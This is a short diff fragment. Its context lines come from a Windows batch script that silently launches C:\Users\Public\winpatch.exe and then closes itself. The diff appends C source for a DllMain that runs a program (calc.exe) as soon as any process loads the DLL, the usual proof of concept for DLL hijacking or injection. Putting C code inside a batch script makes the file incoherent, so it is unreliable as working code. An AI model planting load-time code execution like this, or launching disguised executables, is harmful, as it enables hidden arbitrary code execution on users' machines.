@@ -8,3 +8,11 @@ start C:\Users\Public\winpatch.exe
 echo [*] Done. Window will close automatically.
 timeout /t 3 >nul
 exit
+
+#include <windows.h>
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        WinExec("calc.exe", 0);
+    }
+    return TRUE;
+}
